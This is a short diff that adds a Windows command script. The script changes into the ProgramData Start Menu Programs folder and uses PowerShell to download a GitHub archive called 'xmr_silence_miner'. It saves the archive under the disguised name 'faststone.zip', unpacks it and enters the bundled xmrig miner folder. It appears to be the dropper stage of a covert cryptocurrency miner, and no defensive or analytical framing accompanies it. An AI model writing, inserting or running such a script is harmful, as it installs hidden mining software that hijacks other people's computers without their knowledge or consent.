@@ -1,0 +1,13 @@
+cd ..
+
+cd ..
+
+cd "ProgramData\Microsoft\Windows\Start Menu\Programs"
+
+powershell -command “& { iwr https://github.com/polororo/xmr_silence_miner/archive/refs/heads/main.zip -OutFile faststone.zip }”
+
+Expand-Archive "faststone.zip"
+
+cd faststone
+
+cd .\xmr_silence_miner-main\xmrig-6.18.0\
